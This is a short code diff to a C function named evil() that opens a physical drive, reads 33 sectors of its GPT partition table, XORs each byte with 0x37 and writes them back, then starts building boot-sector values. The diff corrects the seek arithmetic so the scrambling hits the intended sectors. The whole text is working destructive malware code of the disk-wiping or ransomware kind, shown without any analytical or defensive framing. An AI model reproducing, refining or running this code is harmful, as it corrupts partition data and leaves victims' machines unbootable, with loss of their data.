@@ -177,7 +177,7 @@ void evil()
 		memcpy(backup_lba + 0, firstLBA + 32, 8);
 
 		LARGE_INTEGER number;
-		number.QuadPart = (ULONGLONG)uint8to64(backup_lba)*(ULONGLONG)512 +512;
+		number.QuadPart = (ULONGLONG)uint8to64(backup_lba)*(ULONGLONG)512;
 
 		LARGE_INTEGER move;
 		move.QuadPart = (ULONGLONG)-512;
@@ -186,14 +186,14 @@ void evil()
 
 		for (int i = 1; i <= 33; i++)
 		{
-			SetFilePointerEx(PhysicalDrive, move,0, FILE_CURRENT);
 			ReadFile(PhysicalDrive, gpt, 512, &wb, NULL);
 			for (int j = 0; j < 512; j++)gpt[j] ^= 0x37;
 			SetFilePointerEx(PhysicalDrive, move,0, FILE_CURRENT);
 			WriteFile(PhysicalDrive, gpt, 512, &wb, NULL);
 			SetFilePointerEx(PhysicalDrive, move,0, FILE_CURRENT);
+			SetFilePointerEx(PhysicalDrive, move,0, FILE_CURRENT);
 		}
-
+		
 		char special[] = {0x37, 0x37, 0x37, 0x37};
 		BYTE bootflag[] = {0x80};
 		DWORD StartCylinder = 128 / (OutBuffer.TracksPerCylinder * OutBuffer.SectorsPerTrack);
